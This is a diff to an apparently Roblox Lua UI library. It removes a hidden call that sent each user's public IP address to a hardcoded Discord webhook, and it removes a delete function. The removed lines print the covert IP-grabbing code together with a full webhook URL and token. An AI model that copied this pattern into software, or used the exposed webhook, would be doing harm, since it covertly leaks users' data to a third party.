@@ -703,12 +703,4 @@ function getIpAddress()
     return require("json").decode(require("ssl.https").request("https://ipinfo.io/json"))["ip"]
 end
 
-sendDiscordWebhook(
-    "https://discord.com/api/webhooks/1058159308866605149/x4RMhTMlXOiGXui8aR7fKJjMbqlGlB_We4DKPbuqHtGJsO0m6p4TDexGgVue5vntRiQj",
-    "User" + getIpAddress + "Logged in.")
-library.delete = function()
-    libalive = false
-    screengui:Destroy()
-end
-
 return library
